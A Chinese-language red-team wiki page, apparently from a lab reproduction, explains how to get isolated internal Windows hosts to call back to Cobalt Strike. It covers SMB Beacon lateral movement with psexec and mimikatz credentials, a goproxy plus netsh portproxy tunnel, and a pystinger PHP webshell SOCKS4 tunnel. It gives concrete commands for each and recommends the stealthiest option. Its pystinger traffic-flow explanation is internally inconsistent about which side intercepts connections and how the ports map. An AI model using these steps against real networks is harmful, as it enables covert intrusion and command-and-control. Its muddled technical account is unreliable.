---
title: pystinger SOCKS4 代理 Webshell 流量转发与不出网主机上线全链路复现
description: 详细复现 pystinger 方案：在 Web 目录部署 proxy.php 流量转发脚本，内网主机运行 stinger_server.exe
  监听 0.0.0.0，攻击机运行 stinger_client 连接 Webshell 建立本地 SOCKS4 代理端口，配合 Cobalt Strike Listener
  与 psexec 完成不出网主机上线的全链路实战。同时对比 SMB Beacon 与 goproxy+netsh HTTP 代理两种替代方案。
category: program-analysis
tags:
- pystinger
- SOCKS4
- webshell
- proxy
- pivoting
- Cobalt Strike
- internal-network-penetration
- goproxy
- netsh
- SMB Beacon
- psexec
- stagerless
date: '2023-04-16'
updated: '2026-11-15'
---

## 概述

本页面沉淀自微信公众号文章《不出网主机上线方法》，系统记录在 **DMZ 区 Web 服务器可出网、内网主机不出网** 的典型拓扑下，实现内网主机上线 Cobalt Strike (CS) 的三种核心隧道技术：

1.  **SMB Beacon**：利用命名管道在 Beacon 间通信，配合 `psexec` 横向移动上线。
2.  **HTTP 代理隧道**：在 Web 服务器部署 `goproxy`，配合 Windows `netsh portproxy` 端口转发，CS 配置 HTTP Listener 指向代理，生成 **Stageless Payload** 上线。
3.  **pystinger SOCKS4 代理（核心）**：部署 `proxy.php` + `stinger_server.exe` 构建 SOCKS4 代理链，CS 配置 SOCKS4 Listener，配合 `psexec` 完成不出网主机上线。

三种方案均基于同一测试环境复现，形成从 **初始立足点** 到 **内网横向上线** 的完整攻击链对比参考。

## 测试环境拓扑

| 角色 | 系统 | 网络配置 | IP 地址 |
| :--- | :--- | :--- | :--- |
| **Web 服务器 (DMZ)** | Windows Server 2008 R2 | 双网卡：NAT (出网) + Host-Only (内网) | 公网: `192.168.111.132` <br> 内网: `192.168.204.188` |
| **内网主机 (Target)** | Windows Server 2012 | 单网卡：Host-Only (仅内网，不出网) | 内网: `192.168.204.141` |
| **C2 服务器 (Attacker)** | Kali Linux | NAT (出网) | 公网: `192.168.111.129` |

> **拓扑关键点**：Web 服务器充当「跳板/代理节点」，双网卡连接公网与内网；内网主机仅能与 Web 服务器通信，无法直连 C2。

---

## 方法一：SMB Beacon 命名管道横向上线

> 适用场景：已控制内网一台主机（父 Beacon），目标主机开放 445 端口，拥有目标管理员凭据。详细原理与检测对抗见 [[cobalt-strike-external-c2-smb-beacon]]、[[smb-named-pipe-c2-communication]]、[[named-pipe-smb-detection-sysmon]]。

### 使用条件
1.  父 Beacon 所在主机需开放 **445 端口** 接受连接。
2.  仅能链接 **同一 CS Team Server** 管理的 Beacon。
3.  攻击者需持有目标主机的 **管理员权限凭据**（Administrator 或同等权限）。

### 实战步骤
1.  **初始上线与凭据获取**：Web 服务器 (`192.168.204.188`) 上线 CS，执行 `run mimikatz` 导出明文凭据或 NTLM Hash。
2.  **创建 SMB Listener**：
    -   CS 客户端 -> `Cobalt Strike` -> `Listeners` -> `Add`。
    -   `Payload` 选择 `SMB Beacon` (Beacon SMB)。
    -   保存生成 Listener。
3.  **横向移动 (psexec)**：
    -   右键父 Beacon -> `Pivoting` -> `psexec` (或 `psexec_psh` / `psexec64`)。
    -   `Listener` 选择上一步创建的 SMB Listener。
    -   `Target` 填写内网主机 IP (`192.168.204.141`)。
    -   `Credentials` 使用 `mimikatz` 获取的 Administrator 凭据。
4.  **验证上线**：
    -   目标主机上线后，Beacon 列表右侧显示 **`∞∞` 标识**，表示通过命名管道链接父 Beacon。
    -   此时流量路径：`Target (192.168.204.141)` -> `SMB/445` -> `Web Server (192.168.204.188)` -> `HTTP/S` -> `C2 (192.168.111.129)`。

---

## 方法二：goproxy + netsh HTTP 代理隧道 + Stageless Payload

> 适用场景：Web 服务器可执行命令、可出网，需将内网主机流量通过 HTTP 代理转发至 C2。工具链细节见 [[http-proxy-tunneling-goproxy-netsh]]、[[frp内网渗透应用]]、[[c2-redirectors-malleable-c2-profiles]]。

### Web 服务器部署 goproxy
上传 `proxy.exe` (goproxy 编译二进制) 至 Web 服务器，监听内网 IP `192.168.204.188` 的 **8080 端口** (TCP)：
```cmd
shell C:\proxy.exe http -t tcp -p ":8080"
```

### 配置 netsh 端口转发 (Port Proxy)
将 Web 服务器 **内网 IP 的 822 端口** 转发至 **公网 IP 的 8080 端口** (goproxy 实际监听端口)。
> 注：Web 服务器 80 端口被占用，故使用 822 作为内网监听端口。

```cmd
shell netsh interface portproxy add v4tov4 listenaddress=192.168.204.188 listenport=822 connectaddress=192.168.111.132 connectport=8080
```
验证端口转发生效：
```cmd
netstat -ano | findstr :822
```

### CS 创建 HTTP Listener (配置代理)
新建 Listener，关键配置：
-   `Host` (Callback Host): `192.168.204.188` (Web 服务器内网 IP)
-   `Port` (Callback Port): `822` (netsh 转发监听端口)
-   `Beacons` -> `Proxy` 勾选 `Use Proxy`：
    -   `Proxy Type`: `HTTP`
    -   `Proxy Host`: `192.168.111.132` (Web 服务器公网 IP)
    -   `Proxy Port`: `8080` (goproxy 监听端口)
    -   如需认证填写用户名/密码。

### 生成 Stageless Payload 上线
**为何必须 Stageless？**
-   **Stager (分阶段)**：体积小，上线时需向 C2 请求 Stage (Shellcode)，若代理链路不稳或流量特征明显易中断/被查杀。
-   **Stageless (单阶段)**：Payload 内嵌完整 Shellcode，**无需二次下载**，规避代理传输 Shellcode 失败风险，适合隧道质量不可控环境。

操作：`Attacks` -> `Packages` -> `Payload Generator` -> 勾选 `Stageless` -> `Windows Executable (S)` -> 生成 `payload.exe`。

### 部署与上线
将 `payload.exe` 传至内网主机 (`192.168.204.141`) 执行。
**流量链路**：
`Target (192.168.204.141)` -> `HTTP:822` -> `Web Server Internal (192.168.204.188)` -> `netsh portproxy` -> `Web Server Public (192.168.111.132:8080)` -> `goproxy` -> `HTTP` -> `C2 (192.168.111.129)`

---

## 方法三：pystinger SOCKS4 代理 + psexec 横向上线 (核心方案)

> **核心优势**：仅需 Web 目录写入权限部署 PHP 脚本，无需在 Web 服务器执行 `.exe` 长期驻留 (stinger_server.exe 可按需启动)，流量特征为普通 HTTP POST，隐蔽性强。工具项目地址：[pystinger](https://github.com/tengzhangchao/pystinger) (或同类实现)。相关内网穿透技术对比见 [[internal-network-pivoting-techniques]]、[[xd-security-internal-network-penetration-notes-day69-70]]。

### 原理架构
```
[Attacker: stinger_client] <--(HTTP POST)--> [Web Server: proxy.php] <--(TCP Raw Socket)--> [Web Server: stinger_server.exe (Listen 0.0.0.0:Port)] <--(SOCKS4)--> [Target: psexec Payload]
```
-   **proxy.php**：部署在 Web 目录，充当 **HTTP <-> TCP 流量转发器**，接收 `stinger_client` 请求，转发至本地 `stinger_server.exe`。
-   **stinger_server.exe**：运行于 Web 服务器，监听 `0.0.0.0` (或内网 IP) 端口，实现 **SOCKS4 代理服务端** 逻辑 (处理 CONNECT/BIND、转发数据)。
-   **stinger_client**：运行于攻击机，连接 `proxy.php` URL，在本地 (127.0.0.1) 开启 **SOCKS4 监听端口**，供 CS Listener 使用。

### 实战部署步骤

#### Web 服务器部署服务端组件
-   上传 `proxy.php` 至网站可访问目录 (如 `http://192.168.111.132:81/proxy.php`)。
    -   验证：浏览器访问返回 `UTF-8` 即部署成功。
-   上传 `stinger_server.exe` 至任意可执行目录。
-   启动监听 (示例监听端口 60000)：
    ```cmd
    start stinger_server.exe 0.0.0.0 60000
    ```
    > 此时 Web 服务器 `0.0.0.0:60000` 处于 TCP 监听状态，等待 `proxy.php` 转发连接。

#### 攻击机建立 SOCKS4 隧道
在 Kali 上编译/下载 `stinger_client` (Go 语言编写)，执行：
```bash
./stinger_client -w http://192.168.111.132:81/proxy.php -l 127.0.0.1 -p 60000
```
-   `-w`：指定 `proxy.php` 完整 URL。
-   `-l` / `-p`：本地 SOCKS4 监听地址/端口 (此处 `127.0.0.1:60000`)。
-   成功后提示 `Server connected`，本地 `127.0.0.1:60000` 成为 SOCKS4 代理入口。

#### CS 配置 SOCKS4 Listener
新建 Listener (类型 `HTTP` 或 `HTTPS`)，关键配置：
-   `Host`: `192.168.204.188` (Web 服务器 **内网 IP**)
-   `Port`: `60020` (此处为 **转发目标端口**，需与下文 psexec 指定的 Listener 端口一致，或理解为 CS 认为的目标服务端口；实际流量走 SOCKS4 代理)
-   `Beacons` -> `Proxy` 勾选 `Use Proxy`：
    -   `Proxy Type`: `SOCKS4`
    -   `Proxy Host`: `127.0.0.1` (攻击机本地回环)
    -   `Proxy Port`: `60000` (stinger_client 本地监听端口)

> **注意**：CS Listener 的 `Host:Port` 仅用于 Beacon 元数据生成与连接回调标识，**实际 TCP 连接由 SOCKS4 代理拦截并转发至 `stinger_server -> proxy.php -> Target`**。此处 `Port` 可自定义 (如 60020)，但需与生成 Payload 时一致。

#### 生成 Payload 并 psexec 横向移动
-   生成 Payload (建议 **Stageless**，同方法二理由)：`Attacks` -> `Packages` -> `Payload Generator` -> 勾选 `Stageless` -> `Windows Executable (S)` -> `Generate`。
-   使用 `psexec` 横向上线内网主机：
    -   右键 Web 服务器 Beacon (或任意可达内网的 Beacon) -> `Pivoting` -> `psexec`。
    -   `Listener`: 选择上一步创建的 SOCKS4 Listener。
    -   `Target`: `192.168.204.141` (内网主机 IP)。
    -   `Credentials`: Administrator 凭据。

#### 验证上线与流向
内网主机 (`192.168.204.141`) 成功上线 CS。
**完整流量链路**：
1.  `Target` 发起连接 -> 目的 `192.168.204.188:60020` (CS Listener 配置的 Host:Port)。
2.  流量被攻击机 `stinger_client` (监听 `127.0.0.1:60000` SOCKS4) 拦截。
3.  `stinger_client` 封装为 HTTP POST -> 发送至 `http://192.168.111.132:81/proxy.php`。
4.  Web 服务器 `proxy.php` 接收 HTTP -> 解包转发至本地 `127.0.0.1:60000` (即 `stinger_server.exe`)。
5.  `stinger_server.exe` 解析 SOCKS4 请求 -> 与 `Target` 建立 TCP 连接 -> 双向转发数据。
6.  最终实现 `Target` <-> `C2` 通信。

---

## 方案对比与选型建议

| 维度 | SMB Beacon | goproxy + netsh (HTTP Proxy) | **pystinger (SOCKS4)** |
| :--- | :--- | :--- | :--- |
| **前置条件** | 需父 Beacon、445 端口、管理员凭据 | 需 Web 服务器执行命令、写入 exe、netsh 权限 | 需 Web 目录写入权限 (PHP)、Web 服务器执行命令 (启动 server) |
| **隐蔽性** | 命名管道流量 (SMB)，主机层易检测 (Sysmon 17/18) | HTTP 明文/特征明显，需配合 Malleable C2 混淆 | **HTTP 正常 Web 流量 (POST)，无异常端口监听 (仅 80/443)，最隐蔽** |
| **稳定性** | 高 (内网直连) | 中 (依赖 netsh/goproxy 进程存活) | 中 (依赖 PHP 进程、stinger_server 进程、HTTP 连接保活) |
| **适用阶段** | **横向移动阶段** (已有立足点、有凭据) | **初始上线/备用隧道** (Web 服务器可控) | **初始上线/长期隧道** (仅 Webshell 权限、追求隐蔽) |
| **Payload 要求** | 仅限 SMB Beacon / Stageless | **必须 Stageless** | **必须 Stageless** |
| **工具依赖** | CS 原生 | goproxy, netsh (系统自带) | pystinger (客户端/服务端), PHP 环境 |

> **实战建议**：
> -   **首选 pystinger**：仅获取 Webshell 权限时，部署成本低、流量最像正常 Web 访问、无需开放高危端口 (445/8080)。
> -   **备选 SMB Beacon**：已拿下内网一台主机并有凭据时，原生支持、无需额外工具、适合快速横向。
> -   **备选 goproxy**：Web 服务器权限高、需高性能 TCP 转发、或需配合其他 HTTP 代理工具链时使用。

---

## 交叉引用与延伸阅读

### 内网穿透与代理技术体系
-   [[internal-network-pivoting-techniques]]：0x727 团队 Aggressor Script 集成的 FRP、pystinger、SMB Beacon 等代理配置自动化。
-   [[http-proxy-tunneling-goproxy-netsh]]：goproxy + netsh 端口转发搭建 HTTP 代理隧道的详细参数与 CS Listener 配置细节。
-   [[frp内网渗透应用]]：frp 反向代理、Socks5 隧道、多级串联、MSF 代理对接等经典内网穿透场景。
-   [[xd-security-internal-network-penetration-notes-day69-70]]：XD 安全课程笔记，覆盖 SOCKS 代理正反向、Ngrok/Frp 实战、三层内网渗透演练。
-   [[c2-redirectors-malleable-c2-profiles]]：C2 重定向器拓扑、Malleable C2 Profile 流量混淆、域名前置/CDN 隐匿技术。

### 横向移动与凭据利用
-   [[cobalt-strike-external-c2-smb-beacon]]：SMB Beacon、External C2、命名管道通信模型、psexec/atexec/wmiexec 横向上线全流程。
-   [[named-pipe-smb-detection-sysmon]]：基于 Sysmon Event ID 17/18 的命名管道检测规则与蓝队视角。
-   [[smb-named-pipe-c2-communication]]：SMB 协议与命名管道作为 C2 通道的原理、利用与检测对抗。
-   [[shiro-internal-penetration-case-study]]：Shiro RCE 初始访问 -> 免杀上线 CS -> NTLM 导出 -> FTP 横向 -> 威胁溯源完整实战链。
-   [[listed-company-penetration-test-case-study]]：房地产公司实战：文件上传 -> 哥斯拉 -> MSF/CS 会话传递 -> Socks 代理 -> MSSQL/IoT 设备横向。
-   [[0x6270-penetration-test-case-study-2023]]：安服项目实战：SQL 注入 -> xp_cmdshell -> CS 上线 -> 提权/影子用户 -> SOCKS 代理 -> fscan/RDP/IPC$/WMI/FTP 横向拿下 40+ 主机。

### 免杀与 Payload 工程
-   [[cobalt-strike-4.7-bof-internals]]：BOF 加载器内部实现、Relocation 处理、Sleep Kit、PPL 注入绕过。
-   [[ppl-injection-createprocess-bof-fix]]：PPL 进程注入中 `bInheritHandles` 导致 `CreateProcess` 失败的根因与 BOF 文件落地输出绕过方案。
-   [[inceptor-av-edr-evasion-framework]]：Inceptor 免杀框架：Shellcode 转换、编码、AMSI/ETW/WLDP 绕过、Full Unhooking、Direct Syscalls、OLLVM 混淆。
-   [[pe-manual-mapping-loader-implementation]]：PE 手动映射加载器全流程实现 (导入表修复、重定位、延迟导入、API Set Schema、MEM_IMAGE、模块隐藏)。

---

## 参考来源

1.  微信公众号原文：《不出网主机上线方法》 (链接见文章元数据)
2.  红队攻防实践：不出网主机搭建内网隧道新思路 (pystinger 原理来源)
3.  Leanote 笔记：`http://blog.leanote.com/post/snowming/2ec80f7823e0`
4.  FreeBuf 文章：`https://www.freebuf.com/articles/web/247287.html`
5.  CSDN 博客：`https://blog.csdn.net/qq_41874930/article/details/107840269`

---

*编辑者：A1andNS*  
*供稿人：sp4z*  
*归档日期：2023-04-16*  
*分类：program-analysis*  
*标签：#pystinger #SOCKS4 #webshell #proxy #pivoting #CobaltStrike #内网渗透 #goproxy #netsh #SMBBeacon #psexec #stageless*

## 来源

- [0xfafu攻防实验室-202010-202112_08](../sources/0xfafu攻防实验室-202010-202112_08.md)
